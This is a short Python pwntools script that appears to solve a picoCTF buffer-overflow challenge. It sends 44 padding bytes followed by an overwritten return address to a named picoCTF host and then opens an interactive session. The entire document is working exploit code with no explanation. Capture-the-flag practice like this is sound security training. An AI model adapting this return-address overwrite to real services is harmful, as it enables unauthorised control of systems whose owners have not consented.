from pwn import *

payload = 'A' * 44 + '\xf6\x91\x04\x08'
s = remote('saturn.picoctf.net', 50592)
s.send(payload)
s.interactive()